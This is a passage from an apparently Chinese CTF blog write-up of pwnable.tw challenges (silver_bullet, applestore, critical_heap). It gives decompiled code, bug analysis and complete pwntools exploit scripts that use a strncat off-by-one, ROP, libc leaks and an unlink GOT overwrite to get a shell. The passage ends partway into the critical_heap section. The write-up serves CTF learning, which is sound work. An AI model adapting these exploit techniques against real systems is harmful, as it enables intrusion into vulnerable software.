class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl power_up(char *bullet_ptr)</span><br><span class="line">&#123;</span><br><span class="line">  char s; // [esp+0h] [ebp-34h]</span><br><span class="line">  size_t v3; // [esp+30h] [ebp-4h]</span><br><span class="line"></span><br><span class="line">  v3 = 0;</span><br><span class="line">  memset(&amp;s, 0, 0x30u);</span><br><span class="line">  if ( !*bullet_ptr )</span><br><span class="line">    return puts(&quot;You need create the bullet first !&quot;);</span><br><span class="line">  if ( *((_DWORD *)bullet_ptr + 12) &gt; 0x2Fu )</span><br><span class="line">    return puts(&quot;You can&apos;t power up any more !&quot;);</span><br><span class="line">  printf(&quot;Give me your another description of bullet :&quot;);</span><br><span class="line">  read_input(&amp;s, 48 - *((_DWORD *)bullet_ptr + 12));</span><br><span class="line"></span><br><span class="line">  strncat(bullet_ptr, &amp;s, 48 - *((_DWORD *)bullet_ptr + 12));</span><br><span class="line"></span><br><span class="line">  v3 = strlen(&amp;s) + *((_DWORD *)bullet_ptr + 12);</span><br><span class="line">  printf(&quot;Your new power is : %u\n&quot;, v3);</span><br><span class="line">  *((_DWORD *)bullet_ptr + 12) = v3;</span><br><span class="line">  return puts(&quot;Enjoy it !&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="分析-5"><a href="#分析-5" class="headerlink" title="分析"></a>分析</h2><p>乍一看感觉逻辑没什么问题，寻找可能有问题的地方，最后问题在strncat上<br>因为程序的存在一个结构</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">struct bullet&#123;</span><br><span class="line">  char bullet_ptr[0x30]</span><br><span class="line">  int length</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而strncat合并字符串时，合并完之后会在后面加上\x00,因为上面结构体的存在，我们就有希望覆盖length，然后再次powerup便可以溢出覆盖返回地址了。</p><h2 id="exp-5"><a href="#exp-5" class="headerlink" title="exp"></a>exp</h2><p>本地测试莫名其妙过不了，但是远程没问题。。。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">#context.log_level = &apos;debug&apos;</span><br><span class="line">#sh = process (&apos;./silver_bullet&apos;)</span><br><span class="line">sh = remote(&apos;chall.pwnable.tw&apos;,10103)</span><br><span class="line">elf = ELF(&apos;./silver_bullet&apos;)</span><br><span class="line">libc = ELF(&apos;libc_32.so.6&apos;)</span><br><span class="line"></span><br><span class="line">def create(con):</span><br><span class="line">sh.sendline(&apos;1&apos;)</span><br><span class="line">sh.recvuntil(&apos;of bullet :&apos;)</span><br><span class="line">sh.send(con)</span><br><span class="line"></span><br><span class="line">def powerup(con):</span><br><span class="line">    sh.sendline(&apos;2&apos;)</span><br><span class="line">sh.recvuntil(&apos;of bullet :&apos;)</span><br><span class="line">sh.send(con)</span><br><span class="line"></span><br><span class="line">def beat():</span><br><span class="line">    sh.sendline(&apos;3&apos;)</span><br><span class="line"></span><br><span class="line">pop_ebx_ret = 0x8048475</span><br><span class="line"></span><br><span class="line">create(&apos;a&apos;*(0x30-1))</span><br><span class="line">powerup(&apos;1&apos;)</span><br><span class="line"></span><br><span class="line">pay = &apos;\xff&apos;*3 + &apos;zzzz&apos;</span><br><span class="line">pay += p32(elf.plt[&apos;puts&apos;]) + p32(pop_ebx_ret) + p32(elf.got[&apos;puts&apos;])</span><br><span class="line">pay += p32(elf.symbols[&apos;main&apos;])</span><br><span class="line"></span><br><span class="line">powerup(pay)</span><br><span class="line"></span><br><span class="line">beat()</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&apos;win !!\n&apos;)</span><br><span class="line">puts_addr = u32(sh.recv(4))</span><br><span class="line">system_addr = puts_addr - libc.symbols[&apos;puts&apos;] +  libc.symbols[&apos;system&apos;]</span><br><span class="line">binsh_addr = puts_addr - libc.symbols[&apos;puts&apos;] + libc.search(&apos;/bin/sh\x00&apos;).next()</span><br><span class="line"></span><br><span class="line">success(&quot;system_addr : &quot; + hex(system_addr))</span><br><span class="line">success(&quot;binsh_addr : &quot; + hex(binsh_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">create(&apos;a&apos;*(0x30-1))</span><br><span class="line">powerup(&apos;1&apos;)</span><br><span class="line">pay = &apos;\xff&apos;*3 + &apos;bbbb&apos;</span><br><span class="line">pay += p32(system_addr) + p32(pop_ebx_ret) + p32(binsh_addr)</span><br><span class="line">powerup(pay)</span><br><span class="line"></span><br><span class="line">beat()</span><br><span class="line">sh.recv()</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h1 id="applestore"><a href="#applestore" class="headerlink" title="applestore"></a>applestore</h1><p><em>好难啊啊啊啊啊，心累的不行，看大佬的wp回回血</em></p><p>ps: 假如在    libc = ELF(‘./libc_32.so.6’) 时出现这种报错：ValueError: seek out of range ， 多半就是文件没下载完全。。</p><h2 id="题目-6"><a href="#题目-6" class="headerlink" title="题目"></a>题目</h2><p>主要功能</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">int menu()</span><br><span class="line">&#123;</span><br><span class="line">  puts(&quot;=== Menu ===&quot;);</span><br><span class="line">  printf(&quot;%d: Apple Store\n&quot;, 1);</span><br><span class="line">  printf(&quot;%d: Add into your shopping cart\n&quot;, 2);</span><br><span class="line">  printf(&quot;%d: Remove from your shopping cart\n&quot;, 3);</span><br><span class="line">  printf(&quot;%d: List your shopping cart\n&quot;, 4);</span><br><span class="line">  printf(&quot;%d: Checkout\n&quot;, 5);</span><br><span class="line">  return printf(&quot;%d: Exit\n&quot;, 6);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">unsigned int handler()</span><br><span class="line">&#123;</span><br><span class="line">  char nptr; // [esp+16h] [ebp-22h]</span><br><span class="line">  unsigned int v2; // [esp+2Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  v2 = __readgsdword(0x14u);</span><br><span class="line">  while ( 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    printf(&quot;&gt; &quot;);</span><br><span class="line">    fflush(stdout);</span><br><span class="line">    my_read(&amp;nptr, 0x15u);</span><br><span class="line">    switch ( atoi(&amp;nptr) )</span><br><span class="line">    &#123;</span><br><span class="line">      case 1:</span><br><span class="line">        list();</span><br><span class="line">        break;</span><br><span class="line">      case 2:</span><br><span class="line">        add();</span><br><span class="line">        break;</span><br><span class="line">      case 3:</span><br><span class="line">        delete();</span><br><span class="line">        break;</span><br><span class="line">      case 4:</span><br><span class="line">        cart();</span><br><span class="line">        break;</span><br><span class="line">      case 5:</span><br><span class="line">        checkout();</span><br><span class="line">        break;</span><br><span class="line">      case 6:</span><br><span class="line">        puts(&quot;Thank You for Your Purchase!&quot;);</span><br><span class="line">        return __readgsdword(0x14u) ^ v2;</span><br><span class="line">      default:</span><br><span class="line">        puts(&quot;It&apos;s not a choice! Idiot.&quot;);</span><br><span class="line">        break;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其他函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br></pre></td><td class="code"><pre><span class="line">unsigned int add()         //添加购物车，采用了my_read函数，但是存在问题，也就是在read时可以输入\x00在中间分隔，以便在不影响后面的基础上，覆盖后面栈上的内容。</span><br><span class="line">&#123;</span><br><span class="line">  char **v1; // [esp+1Ch] [ebp-2Ch]</span><br><span class="line">  char nptr; // [esp+26h] [ebp-22h]</span><br><span class="line">  unsigned int v3; // [esp+3Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  v3 = __readgsdword(0x14u);</span><br><span class="line">  printf(&quot;Device Number&gt; &quot;);</span><br><span class="line">  fflush(stdout);</span><br><span class="line">  my_read(&amp;nptr, 0x15u);</span><br><span class="line">  switch ( atoi(&amp;nptr) )</span><br><span class="line">  &#123;</span><br><span class="line">    case 1:</span><br><span class="line">      v1 = create((int)&quot;iPhone 6&quot;, (char *)199);</span><br><span class="line">      insert((int)v1);</span><br><span class="line">      goto LABEL_8;</span><br><span class="line">    case 2:</span><br><span class="line">      v1 = create((int)&quot;iPhone 6 Plus&quot;, (char *)299);</span><br><span class="line">      insert((int)v1);</span><br><span class="line">      goto LABEL_8;</span><br><span class="line">    case 3:</span><br><span class="line">      v1 = create((int)&quot;iPad Air 2&quot;, (char *)499);</span><br><span class="line">      insert((int)v1);</span><br><span class="line">      goto LABEL_8;</span><br><span class="line">    case 4:</span><br><span class="line">      v1 = create((int)&quot;iPad Mini 3&quot;, (char *)399);</span><br><span class="line">      insert((int)v1);</span><br><span class="line">      goto LABEL_8;</span><br><span class="line">    case 5:</span><br><span class="line">      v1 = create((int)&quot;iPod Touch&quot;, (char *)199);</span><br><span class="line">      insert((int)v1);</span><br><span class="line">LABEL_8:</span><br><span class="line">      printf(&quot;You&apos;ve put *%s* in your shopping cart.\n&quot;, *v1);</span><br><span class="line">      puts(&quot;Brilliant! That&apos;s an amazing idea.&quot;);</span><br><span class="line">      break;</span><br><span class="line">    default:</span><br><span class="line">      puts(&quot;Stop doing that. Idiot!&quot;);</span><br><span class="line">      break;</span><br><span class="line">  &#125;</span><br><span class="line">  return __readgsdword(0x14u) ^ v3;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">int cart()</span><br><span class="line">&#123;</span><br><span class="line">  signed int v0; // eax</span><br><span class="line">  signed int v2; // [esp+18h] [ebp-30h]</span><br><span class="line">  int cost; // [esp+1Ch] [ebp-2Ch]</span><br><span class="line">  _DWORD *i; // [esp+20h] [ebp-28h]</span><br><span class="line">  char buf; // [esp+26h] [ebp-22h]</span><br><span class="line">  unsigned int v6; // [esp+3Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  v6 = __readgsdword(0x14u);</span><br><span class="line">  v2 = 1;</span><br><span class="line">  cost = 0;</span><br><span class="line">  printf(&quot;Let me check your cart. ok? (y/n) &gt; &quot;);</span><br><span class="line">  fflush(stdout);</span><br><span class="line">  my_read(&amp;buf, 0x15u);</span><br><span class="line">  if ( buf == &apos;y&apos; )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;==== Cart ====&quot;);  //遍历链表来输出cart</span><br><span class="line">    for ( i = (_DWORD *)mycart; i; i = (_DWORD *)i[2] )</span><br><span class="line">    &#123;</span><br><span class="line">      v0 = v2++;</span><br><span class="line">      printf(&quot;%d: %s - $%d\n&quot;, v0, *i, i[1]);   // i[1] == money</span><br><span class="line">                                                </span><br><span class="line">      cost += i[1];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  return cost;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">unsigned int delete()</span><br><span class="line">&#123;</span><br><span class="line">  signed int v1; // [esp+10h] [ebp-38h]</span><br><span class="line">  _DWORD *v2; // [esp+14h] [ebp-34h]</span><br><span class="line">  int v3; // [esp+18h] [ebp-30h]</span><br><span class="line">  int FD; // [esp+1Ch] [ebp-2Ch]</span><br><span class="line">  int BK; // [esp+20h] [ebp-28h]</span><br><span class="line">  char nptr; // [esp+26h] [ebp-22h]</span><br><span class="line">  unsigned int v7; // [esp+3Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  v7 = __readgsdword(0x14u);</span><br><span class="line">  v1 = 1;</span><br><span class="line">  v2 = (_DWORD *)mycart;</span><br><span class="line">  printf(&quot;Item Number&gt; &quot;);</span><br><span class="line">  fflush(stdout);</span><br><span class="line">  my_read(&amp;nptr, 0x15u);</span><br><span class="line">  v3 = atoi(&amp;nptr);</span><br><span class="line">  while ( v2 )</span><br><span class="line">  &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    if ( v1 == v3 )                  //典型的unlink</span><br><span class="line">    &#123;</span><br><span class="line">      FD = v2[2];</span><br><span class="line">      BK = v2[3];</span><br><span class="line">      if ( BK )</span><br><span class="line">        *(_DWORD *)(BK + 8) = FD;</span><br><span class="line">      if ( FD )</span><br><span class="line">        *(_DWORD *)(FD + 12) = BK;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      printf(&quot;Remove %d:%s from your shopping cart.\n&quot;, v1, *v2);</span><br><span class="line">      return __readgsdword(0x14u) ^ v7;</span><br><span class="line">    &#125;</span><br><span class="line">    ++v1;</span><br><span class="line">    v2 = (_DWORD *)v2[2];</span><br><span class="line">  &#125;</span><br><span class="line">  return __readgsdword(0x14u) ^ v7;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">unsigned int checkout()</span><br><span class="line">&#123;</span><br><span class="line">  int v1; // [esp+10h] [ebp-28h]</span><br><span class="line">  char *v2; // [esp+18h] [ebp-20h]</span><br><span class="line">  int v3; // [esp+1Ch] [ebp-1Ch]</span><br><span class="line">  unsigned int v4; // [esp+2Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  v4 = __readgsdword(0x14u);</span><br><span class="line">  v1 = cart();</span><br><span class="line">  if ( v1 == 7174 )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;*: iPhone 8 - $1&quot;);</span><br><span class="line">    asprintf(&amp;v2, &quot;%s&quot;, &quot;iPhone 8&quot;);</span><br><span class="line">    v3 = 1;</span><br><span class="line">    insert((int)&amp;v2);</span><br><span class="line">    v1 = 7175;</span><br><span class="line">  &#125;</span><br><span class="line">  printf(&quot;Total: $%d\n&quot;, v1);</span><br><span class="line">  puts(&quot;Want to checkout? Maybe next time!&quot;);</span><br><span class="line">  return __readgsdword(0x14u) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="分析-6"><a href="#分析-6" class="headerlink" title="分析"></a>分析</h2><p>在不断的使用添加购物车的函数add后，其形成了一个链表，而在输出时是通过遍历链表来依次输出的。<br>结构str大概如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">str[0]: cost</span><br><span class="line">str[1]: name---&gt; 实际为指针</span><br><span class="line">str[2]: FD</span><br><span class="line">str[3]: BK</span><br></pre></td></tr></table></figure><p>而我们在输入时使用的my_read函数（cart/delete函数均调用）因为可以覆盖后面的栈，所以会有希望去修改链表的节点为got表之类的。然后cart函数来泄露libc基址等等。</p><p>同时，在delete函数中使用了unlink的过程，也有利用的希望。RELRO不是full说明GOT表还是可以修改的，所以可以用unlink来修改got表.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># checksec applestore</span><br><span class="line">[*] &apos;/root/pwnable/applestore/applestore&apos;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>不过漏洞利用的切入点其实在后面，在checkout函数里，当购物车金额达到7174，就会赠送一个iphone8…而偏偏赠送的这个iphone8被放在了栈里面。而其实这几个函数用的都是同一栈帧（栈顶或许有差异，但是栈底是一致的），而恰好存储iphone8的位置在其他函数中可以被修改。也就是链表的结尾分配到了我们可以修改的栈上。</p><p>除此以外，需要栈地址的泄露，可以：</p><ol><li>利用前面的leak洞,从第一个chunk开始,不断leak chunk的fd,直到stack上的chunk的前一个的chunk的fd,即可得到stack</li><li>我们可以用environ变量加上libc的基址来得到栈地址。</li></ol><h2 id="exp-6"><a href="#exp-6" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">#sh = process(&apos;./applestore&apos;)</span><br><span class="line">sh = remote(&apos;chall.pwnable.tw&apos;, 10104)</span><br><span class="line">bin = ELF(&apos;./applestore&apos;)</span><br><span class="line">libc = ELF(&apos;./libc_32.so.6&apos;)</span><br><span class="line"></span><br><span class="line">def buy(idx):</span><br><span class="line">sh.sendline(&apos;2&apos;)</span><br><span class="line">sh.recvuntil(&apos;Device Number&gt; &apos;)</span><br><span class="line">sh.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">def dele(idx):</span><br><span class="line">sh.sendline(&apos;3&apos;)</span><br><span class="line">sh.recvuntil(&apos;Item Number&gt; &apos;)</span><br><span class="line">sh.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">def dele2(con):</span><br><span class="line">sh.sendline(&apos;3&apos;)</span><br><span class="line">sh.recvuntil(&apos;Item Number&gt; &apos;)</span><br><span class="line">sh.sendline(con)</span><br><span class="line"></span><br><span class="line">def show(con):</span><br><span class="line">sh.sendline(&apos;4&apos;)</span><br><span class="line">sh.recvuntil(&apos;(y/n) &gt; &apos;)</span><br><span class="line">sh.sendline(con)</span><br><span class="line"></span><br><span class="line">def checkout():</span><br><span class="line">sh.sendline(&apos;5&apos;)</span><br><span class="line">sh.recvuntil(&apos;(y/n) &gt; &apos;)</span><br><span class="line">sh.sendline(&apos;y&apos;)</span><br><span class="line"></span><br><span class="line">for i in range(20):</span><br><span class="line">buy(2)</span><br><span class="line">for i in range(6):</span><br><span class="line">buy(1)</span><br><span class="line"></span><br><span class="line">checkout()</span><br><span class="line">pay = &apos;y\x00&apos;</span><br><span class="line">pay+=p32(bin.got[&apos;puts&apos;]) + 3*p32(0)</span><br><span class="line">show(pay)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&apos;27: &apos;)</span><br><span class="line">libc.address = u32(sh.recv(4))-libc.symbols[&apos;puts&apos;]</span><br><span class="line">envp = libc.symbols[&apos;environ&apos;]</span><br><span class="line">system = libc.symbols[&apos;system&apos;]</span><br><span class="line">success(&apos;libc_base: &apos;+hex(libc.address))</span><br><span class="line">success(&apos;envp: &apos;+hex(envp))</span><br><span class="line"></span><br><span class="line">pay = &apos;y\x00&apos;</span><br><span class="line">pay+=p32(envp)+p32(1)+p32(0)+p32(0)</span><br><span class="line">show(pay)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&apos;27: &apos;)</span><br><span class="line">stack_envp = u32(sh.recv(4))</span><br><span class="line">success(&apos;stack_envp: &apos;+hex(stack_envp))    //通过environ泄露栈地址</span><br><span class="line"></span><br><span class="line">//仍未理解的过程：交换GOT和ebp,从而子函数ret后回到main,ebp会到GOT上,在main中read,会读到GOT表上,可以改写atoi到system.</span><br><span class="line"></span><br><span class="line">ebp = stack_envp-0x104</span><br><span class="line">atoi_got = bin.got[&apos;atoi&apos;]</span><br><span class="line">pay = &apos;27&apos;</span><br><span class="line">pay += p32(envp)+p32(1)+p32(ebp-0xc)+p32(atoi_got+0x20-2)</span><br><span class="line">dele2(pay)</span><br><span class="line"></span><br><span class="line">pay = &apos;$0\x00\x00&apos;+p32(system)</span><br><span class="line">sh.sendline(pay)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h1 id="critical-heap"><a href="#critical-heap" class="headerlink" title="critical_heap"></a>critical_heap</h1><p><em>难到仅有的wp基本上完全看不懂。。。</em></p><h2 id="题目-7"><a href="#题目-7" class="headerlink" title="题目"></a>题目</h2><p>题目比较长，功能比较丰富。。</p><p>分析出来的结构体：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">struct clock&#123;</span><br><span class="line">  int *name;</span><br><span class="line">  int inuse;</span><br><span class="line">  0xDEADBEEF;</span><br><span class="line">  char[4] year;</span><br><span class="line">  char[4] month;</span><br><span class="line">  char[4] day;</span><br><span class="line">  char[4] hour;</span><br><span class="line">  char[4] minute;</span><br><span class="line">  char[4] second;</span><br><span class="line"></span><br><span class="line">&#125;; </span><br><span class="line"></span><br><span class="line">struct system&#123;</span><br><span class="line">  int *name;</span><br><span class="line">  int inuse;</span><br><span class="line">  0x48694869;</span><br><span class="line">  string PathOfSystem;</span><br><span class="line">  string DetailOfSystem;</span><br><span class="line">  char[4] UserOfSystem;</span><br><span class="line">  char[4] NameOfSystem;</span><br><span class="line">  char[4] rand;</span><br><span class="line"></span><br><span class="line">&#125;;  </span><br><span class="line"></span><br><span class="line">struct normal&#123;</span><br><span class="line">  int *name;</span><br><span class="line">  int inuse;</span><br><span class="line">  0x13371337;</span><br><span class="line">  char[40] content;</span><br><span class="line">  int sig;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="分析-7"><a href="#分析-7" class="headerlink" title="分析"></a>分析</h2><p>完全没有见过的漏洞。。。相较于文件漏洞，倒更像是函数源码漏洞与小小的文件漏洞相配合产生的大问题。。。</p><ol><li>localtime和setenv配合能将任意文件内容写到heap上.  </li><li>chunk_system的detail在offset 0x20,chunk_normal的content在offset 0x18的位置,content读取的时候没有截断,而detail是存在栈上的,因此可以leak heap. （比较容易想到的漏洞,文件漏洞）.</li><li>在normal_heap的play下,有一个printf_chk的fmt洞,配合normal_heap的play下的change content就能在栈上留下信息,然后任意地址读(因为有chk,所以应该是无法用%n来任意地址写的).</li></ol><p>第一步需要看localtime的源码：以libc2.23源码为例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span 